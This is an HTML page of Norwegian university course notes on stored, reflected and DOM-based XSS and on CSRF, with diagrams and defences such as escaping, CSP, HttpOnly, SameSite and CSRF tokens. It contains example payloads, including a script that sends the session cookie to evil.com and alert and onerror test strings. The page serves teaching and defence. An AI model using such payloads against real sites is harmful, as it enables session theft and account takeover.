@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS og CSRF — Kapittel 2</title>
+<link rel="stylesheet" href="../style.css">
+<link rel="icon" type="image/png" href="../favicon.png">
+</head>
+<body>
+<nav class="site-nav">
+  <div class="container">
+    <a href="../" class="brand">TDT4237</a>
+    <a href="index.html" class="nav-back">&larr; Kapittel 2</a>
+    <div class="nav-search-wrapper">
+      <svg class="nav-search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+      <input type="text" id="nav-search" placeholder="Laster…" autocomplete="off" disabled>
+      <div id="nav-search-results"></div>
+    </div>
+  </div>
+</nav>
+
+<main data-chapter="Kapittel 2: OWASP Top 10">
+<header class="hero">
+  <div class="container">
+    <div class="eyebrow">Kapittel 2 · XSS · CSRF</div>
+    <h1>XSS og <em>CSRF</em></h1>
+    <p class="lede">Skriptet som sitter i databasen og venter på alle som åpner siden — og forespørselen nettleseren sender uten å spørre brukeren.</p>
+    <nav class="toc">
+      <a href="#stored-xss"><span class="toc-num">01</span>Stored XSS</a>
+      <a href="#reflected-xss"><span class="toc-num">02</span>Reflected XSS</a>
+      <a href="#dom-xss"><span class="toc-num">03</span>DOM-basert XSS</a>
+      <a href="#csrf"><span class="toc-num">04</span>CSRF</a>
+      <a href="#forsvar-xss-csrf"><span class="toc-num">05</span>Forsvar</a>
+    </nav>
+  </div>
+</header>
+
+<section id="stored-xss">
+  <div class="container">
+    <div class="section-badge">01 · Stored XSS</div>
+    <h2>Stored <em>XSS</em></h2>
+    <p class="section-intro">Det ondsinnede skriptet lagres i databasen og kjøres for alle brukere som ser innholdet — angrepet skalerer av seg selv.</p>
+    <p class="lead">Et kommentarfelt på en blogg. En angriper skriver ikke «Flott innlegg!» — angriperen skriver <code>&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</code>. Kommentaren lagres i databasen. Neste gang siden lastes — for deg, for administratoren, for alle — kjøres skriptet i nettleseren og sender session-cookien til angriperen.</p>
+
+    <figure class="fig-frame">
+      <svg viewBox="0 0 720 200" xmlns="http://www.w3.org/2000/svg" font-family="IBM Plex Sans, sans-serif" font-size="13">
+        <defs>
+          <marker id="sarr" markerWidth="8" markerHeight="8" refX="4" refY="4" orient="auto">
+            <path d="M1,1 L7,4 L1,7 Z" fill="#b04428"/>
+          </marker>
+        </defs>
+        <!-- Boks: Angriper -->
+        <rect x="30" y="70" width="130" height="50" rx="3" fill="rgba(176,68,40,0.12)" stroke="#b04428" stroke-width="1.5"/>
+        <text x="95" y="91" text-anchor="middle" font-weight="600" fill="#b04428">Angriper</text>
+        <text x="95" y="108" text-anchor="middle" font-size="11" fill="#6b6257" font-style="italic">POST kommentar</text>
+        <!-- Pil til server -->
+        <line x1="162" y1="95" x2="248" y2="95" stroke="#b04428" stroke-width="1.5" marker-end="url(#sarr)"/>
+        <!-- Boks: Server/DB -->
+        <rect x="250" y="70" width="140" height="50" rx="3" fill="rgba(45,74,122,0.1)" stroke="#2d4a7a" stroke-width="1.5"/>
+        <text x="320" y="91" text-anchor="middle" font-weight="600" fill="#2d4a7a">Server + DB</text>
+        <text x="320" y="108" text-anchor="middle" font-size="11" fill="#6b6257" font-style="italic">lagrer &lt;script&gt;…</text>
+        <!-- Pil til offer -->
+        <line x1="392" y1="95" x2="478" y2="95" stroke="#b04428" stroke-width="1.5" marker-end="url(#sarr)"/>
+        <!-- Boks: Offer -->
+        <rect x="480" y="70" width="120" height="50" rx="3" fill="rgba(61,107,58,0.1)" stroke="#3d6b3a" stroke-width="1.5"/>
+        <text x="540" y="91" text-anchor="middle" font-weight="600" fill="#3d6b3a">Offer (alle)</text>
+        <text x="540" y="108" text-anchor="middle" font-size="11" fill="#6b6257" font-style="italic">laster siden</text>
+        <!-- Pil tilbake til angriper (cookie-tyveri) -->
+        <path d="M600,70 Q620,20 360,20 Q120,20 95,68" fill="none" stroke="#b04428" stroke-width="1.5" stroke-dasharray="5,4" marker-end="url(#sarr)"/>
+        <text x="360" y="15" text-anchor="middle" font-size="11" fill="#b04428" font-style="italic">cookie sendt til angriper</text>
+      </svg>
+      <figcaption>Stored XSS-flyt: angriperen lagrer payload én gang, og alle besøkende kjører skriptet.</figcaption>
+    </figure>
+
+    <p>Stored XSS er den farligste varianten fordi den ikke krever at offeret klikker en spesiell lenke — det holder å besøke siden. Og fordi administrasjonsgrensesnitt ofte viser brukerinnhold, er adminsesjonskompromittering et klassisk mål.</p>
+  </div>
+</section>
+
+<section id="reflected-xss">
+  <div class="container">
+    <div class="section-badge">02 · Reflected XSS</div>
+    <h2>Reflected <em>XSS</em></h2>
+    <p class="section-intro">Payloaden lever i URL-en og «reflekteres» tilbake i svaret — offeret må lures til å klikke lenken.</p>
+    <p class="lead">Et søkefelt returnerer «Du søkte på: <em>søkeord</em>» uten å escape søkeordet. En angriper konstruerer en URL som <code>/search?q=&lt;script&gt;...&lt;/script&gt;</code> og sender den til offeret via phishing. Nettleseren laster siden, serveren reflekterer payloaden i HTML-en, og skriptet kjøres.</p>
+
+    <pre><code><span class="comment">&lt;!-- Sårbar: søkeord satt inn direkte i HTML --&gt;</span>
+Du søkte på: {{ søkeord }}
+
+<span class="comment">&lt;!-- Sikker: auto-escaping i Jinja2 --&gt;</span>
+Du søkte på: {{ søkeord | e }}
+
+<span class="comment">&lt;!-- Eller: bruk textContent i JavaScript, aldri innerHTML --&gt;</span>
+document.getElementById('result').textContent = søkeord;</code></pre>
+
+    <p>Reflected XSS er enkelt å teste for: søk etter <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> og se om dialogboksen dukker opp. Automatiserte scannere som OWASP ZAP oppdager det for deg. Likevel er det fortsatt svært vanlig.</p>
+  </div>
+</section>
+
+<section id="dom-xss">
+  <div class="container">
+    <div class="section-badge">03 · DOM-basert XSS</div>
+    <h2>DOM-basert <em>XSS</em></h2>
+    <p class="section-intro">Angrepet skjer helt i nettleseren — serveren ser aldri payloaden, og server-side sanitering hjelper ikke.</p>
+    <p class="lead">JavaScript leser <code>location.hash</code> for å vise en velkomstmelding: <code>document.getElementById('greeting').innerHTML = location.hash.slice(1)</code>. En angriper sender lenken <code>/page#&lt;img src=x onerror=alert(1)&gt;</code>. Fragmentet sendes aldri til serveren — det bor i nettleseren. <code>innerHTML</code> parser og kjører det.</p>
+
+    <p>Sinkene du alltid skal behandle med mistenksomhet:</p>
+    <ul>
+      <li><code>element.innerHTML</code>, <code>element.outerHTML</code></li>
+      <li><code>document.write()</code>, <code>document.writeln()</code></li>
+      <li><code>eval()</code>, <code>setTimeout(string)</code>, <code>setInterval(string)</code></li>
+      <li><code>element.setAttribute('href', ...)</code>, <code>element.src = ...</code></li>
+    </ul>
+
+    <div class="callout callout-blue">
+      <h4>Løsning</h4>
+      <p>Bruk <code>textContent</code> fremfor <code>innerHTML</code> for ren tekst. Bruk Trusted Types API for å tvinge gjennom sikre sinkoperasjoner. DOMPurify for situasjoner der du faktisk trenger å sette HTML fra brukerkontrollert kilde.</p>
+    </div>
+  </div>
+</section>
+
+<section id="csrf">
+  <div class="container">
+    <div class="section-badge">04 · CSRF</div>
+    <h2>Cross-Site Request <em>Forgery</em></h2>
+    <p class="section-intro">Nettleseren sender cookies automatisk — og angriperen utnytter det til å la offeret utføre handlinger de ikke vet om.</p>
+    <p class="lead">Du er innlogget på banken din i én fane. I en annen fane åpner du en ondsinnet side som inneholder en skjult form som POSTer til bankens overføringsskjema. Nettleseren din sender automatisk med bankens session-cookie. Banken ser en autentisert forespørsel og utfører overføringen — uten at du vet det.</p>
+
+    <figure class="fig-frame">
+      <svg viewBox="0 0 720 190" xmlns="http://www.w3.org/2000/svg" font-family="IBM Plex Sans, sans-serif" font-size="12">
+        <defs>
+          <marker id="carr" markerWidth="8" markerHeight="8" refX="4" refY="4" orient="auto">
+            <path d="M1,1 L7,4 L1,7 Z" fill="#b04428"/>
+          </marker>
+        </defs>
+        <!-- Offer -->
+        <rect x="30" y="70" width="120" height="50" rx="3" fill="rgba(61,107,58,0.1)" stroke="#3d6b3a" stroke-width="1.5"/>
+        <text x="90" y="91" text-anchor="middle" font-weight="600" fill="#3d6b3a">Offer</text>
+        <text x="90" y="107" text-anchor="middle" font-size="11" fill="#6b6257" font-style="italic">innlogget på bank</text>
+        <!-- Angriper nettside -->
+        <rect x="240" y="70" width="140" height="50" rx="3" fill="rgba(176,68,40,0.1)" stroke="#b04428" stroke-width="1.5"/>
+        <text x="310" y="91" text-anchor="middle" font-weight="600" fill="#b04428">evil.com</text>
+        <text x="310" y="107" text-anchor="middle" font-size="11" fill="#6b6257" font-style="italic">skjult &lt;form action=bank&gt;</text>
+        <!-- Bank -->
+        <rect x="500" y="70" width="140" height="50" rx="3" fill="rgba(45,74,122,0.1)" stroke="#2d4a7a" stroke-width="1.5"/>
+        <text x="570" y="91" text-anchor="middle" font-weight="600" fill="#2d4a7a">bank.no</text>
+        <text x="570" y="107" text-anchor="middle" font-size="11" fill="#6b6257" font-style="italic">ser autentisert POST</text>
+        <!-- Offer åpner evil -->
+        <line x1="152" y1="88" x2="238" y2="88" stroke="#b04428" stroke-width="1.5" marker-end="url(#carr)"/>
+        <text x="195" y="82" text-anchor="middle" font-size="10" fill="#6b6257">åpner</text>
+        <!-- Nettleser sender forespørsel til bank -->
+        <line x1="382" y1="95" x2="498" y2="95" stroke="#b04428" stroke-width="1.5" marker-end="url(#carr)"/>
+        <text x="440" y="88" text-anchor="middle" font-size="10" fill="#b04428" font-style="italic">POST + cookie</text>
+        <!-- Offer vet ikke -->
+        <text x="90" y="145" text-anchor="middle" font-size="11" fill="#a39886" font-style="italic">vet ikke om det</text>
+      </svg>
+      <figcaption>CSRF-flyt: nettleseren sender session-cookie automatisk — banken ser en tilsynelatende legitim forespørsel.</figcaption>
+    </figure>
+
+    <p>CSRF rammer alt som endrer tilstand på serveren via en forespørsel med cookies: passordendring, e-postendring, overføringer, slettinger.</p>
+  </div>
+</section>
+
+<section id="forsvar-xss-csrf">
+  <div class="container">
+    <div class="section-badge">05 · Forsvar</div>
+    <h2>Forsvar mot XSS og <em>CSRF</em></h2>
+    <p class="section-intro">Kontrollene for de to angrepene er forskjellige, men begge kan settes opp med kjente HTTP-mekanismer.</p>
+    <p class="lead">For XSS er den primære løsningen output-escaping: all brukerkontrollert data som settes inn i HTML-kontekst må escapes for HTML-entiteter. For JavaScript-kontekst brukes JSON-encoding. For URL-kontekst brukes URL-encoding. Det finnes ingen kontekst der rå brukerkontrollert input er trygt å sette inn direkte.</p>
+
+    <h3>XSS-forsvar</h3>
+    <ul>
+      <li><strong>Output-escaping:</strong> bruk mal-motorens auto-escape (Jinja2, React, Angular gjør dette som standard).</li>
+      <li><strong><code>HttpOnly</code>:</strong> session-cookies er ikke lesbare fra JavaScript.</li>
+      <li><strong>Content-Security-Policy (CSP):</strong> begrens hvilke script-kilder som er tillatt. <code>Content-Security-Policy: default-src 'self'; script-src 'self'</code> blokkerer inline scripts og scripts fra andre domener.</li>
+      <li><strong>Trusted Types:</strong> tvinger kode til å bruke eksplisitte saniterings-API-er for DOM-manipulasjon.</li>
+    </ul>
+
+    <h3>CSRF-forsvar</h3>
+    <ul>
+      <li><strong>CSRF-token:</strong> server genererer uforutsigbar token per sesjon, legger den i skjult felt, validerer ved mottak.</li>
+      <li><strong><code>SameSite=Strict</code>:</strong> nettleseren sender aldri cookien med cross-site-forespørsler.</li>
+      <li><strong>Double Submit Cookie:</strong> token sendes både som cookie og i request body/header — cross-site kode kan ikke lese cookien.</li>
+      <li><strong>Verifiser <code>Origin</code>/<code>Referer</code>-header:</strong> sekundær kontroll.</li>
+    </ul>
+
+    <div class="callout callout-green">
+      <h4>Kombinasjonen som holder</h4>
+      <p><code>HttpOnly</code> + <code>SameSite=Strict</code> + CSP + CSRF-token. Ingen av dem er tilstrekkelig alene; alle fire gir et robust forsvar.</p>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer>
+  <div class="container">
+    <div class="ornament">&#10043; &#10043; &#10043;</div>
+    <p>NTNU · TDT4237 · Vår 2026</p>
+  </div>
+</footer>
+
+<script src="../chat-widget.js"></script>
+<script src="../nav-search.js"></script>
+</body>
+</html>
